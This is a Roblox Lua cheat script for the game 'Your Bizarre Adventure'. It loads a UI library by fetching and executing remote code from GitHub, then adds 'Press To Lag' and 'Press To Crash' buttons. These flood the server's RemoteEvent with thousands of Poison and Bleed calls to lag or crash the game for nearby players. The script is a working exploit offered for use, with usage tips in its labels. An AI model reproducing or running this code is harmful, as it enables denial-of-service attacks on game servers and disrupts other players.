local player = game.Players.LocalPlayer
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
OrionLib:MakeNotification({
	Name = "Let's dance!",
	Content = "Credits: TurboX",
	Image = "rbxassetid://4483345998",
	Time = 10
})
local Window = OrionLib:MakeWindow({Name = "XFuck YBA | BETA", HidePremium = false, SaveConfig = true, ConfigFolder = "Yba_CONFIG", IntroText = "TurboX"})
local Crasher = Window:MakeTab({
	Name = "Crasher(Beta)",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
Crasher:AddLabel("TURN OFF DAMAGE INDICATOR IN YBA SETTINGS")
Crasher:AddLabel("CRASH/LAG ONLY WORK NEAR PEOPLE")
Crasher:AddLabel("LAG WORKS FOR 30 SECONDS YOU CAN SPAM IT")
Crasher:AddLabel("DONT ATTACK OR COLLECT ITEMS WHILE CRASH")
Crasher:AddLabel("Credits: TurboX  Version: BETA")
Crasher:AddButton({
	Name = "Press To Lag",
	Callback = function()
      		for i = 1, 750 do
    		player.Character.RemoteEvent:FireServer("Poison", {Duration = 30, TotalDamage = 0.0001})
    		player.Character.RemoteEvent:FireServer("Bleed", {Duration = 30, TotalDamage = 0.0001})
			end
  	end    
})
Crasher:AddButton({
	Name = "Press To Crash",
	Callback = function()
      		for i = 1, 30000 do
    		player.Character.RemoteEvent:FireServer("Poison", {Duration = 1, TotalDamage = 0.0001})
    		player.Character.RemoteEvent:FireServer("Bleed", {Duration = 1, TotalDamage = 0.0001})
			end
  	end    
})
Crasher:AddButton({
	Name = "Destroy UI",
	Callback = function()
      		OrionLib:Destroy()
  	end    
})
local LP = Window:MakeTab({
	Name = "Local Player",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
LP:AddLabel("Soon...")
OrionLib:Init()
